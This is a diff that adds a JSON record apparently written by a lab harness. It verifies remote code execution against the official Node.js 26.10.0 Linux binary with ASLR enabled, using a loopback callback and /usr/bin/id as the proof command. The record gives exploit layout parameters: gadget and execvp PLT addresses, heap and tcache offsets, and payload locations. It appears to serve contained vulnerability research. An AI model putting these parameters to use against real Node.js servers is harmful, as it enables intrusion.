@@ -1,0 +1,50 @@
+{
+  "attempts": [
+    {
+      "candidate": "v26-0x200",
+      "elapsed_seconds": 1.608,
+      "outcome": "rce-proof"
+    }
+  ],
+  "callback_peer": "127.0.0.1",
+  "lab_controls": {
+    "address_read_used": false,
+    "aslr": "enabled",
+    "callback": "127.0.0.1:4444",
+    "cap_drop": "ALL",
+    "debugger_used": false,
+    "kernel_randomize_va_space": 2,
+    "ld_preload_present": false,
+    "n2s_disable_aslr_present": false,
+    "no_new_privileges": true,
+    "proof_command": "/usr/bin/id (fixed)",
+    "read_only_rootfs": true,
+    "target": "127.0.0.1:3000"
+  },
+  "node_binary_sha256": "ab9c8eecf9f82d6693cdc3accced17034065c8d96213b0aa76a7e803d20ae1da",
+  "official_archive_sha256": "ca70e9e349de048b9522abb3adc05b3bd6f43c5ffd3ec57916c7da292f59f022",
+  "official_archive_url": "https://nodejs.org/dist/v26.10.0/node-v26.10.0-linux-x64.tar.xz",
+  "profile": {
+    "bss_payload": "0x7343840",
+    "callback_gadget": "0x99bbb0",
+    "callback_pointer_offset": "0x10",
+    "context_pointer_offset": "0x8",
+    "execvp_plt": "0x82ef40",
+    "layout_candidate": "v26-0x200",
+    "pContext": "0x7343848",
+    "pFree": "0x7343850",
+    "poison_staged_position": "-0x800a118",
+    "record_size": "0x200",
+    "ring_from_heap": "0x800ab70",
+    "tcache_entry_from_heap": "0xa58",
+    "tcache_index": 31
+  },
+  "proof_channel": "fresh loopback callback",
+  "proof_command": "/usr/bin/id (fixed)",
+  "proof_stdout": "uid=1000(node) gid=1000(node) groups=1000(node)",
+  "proof_token": "N2S_43d7473e0b49ccaa34c53d440842b0db",
+  "result": "rce-verified",
+  "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
+  "verified_at": "2026-10-23T21:53:30.085235+00:00",
+  "version": "26.10.0"
+}
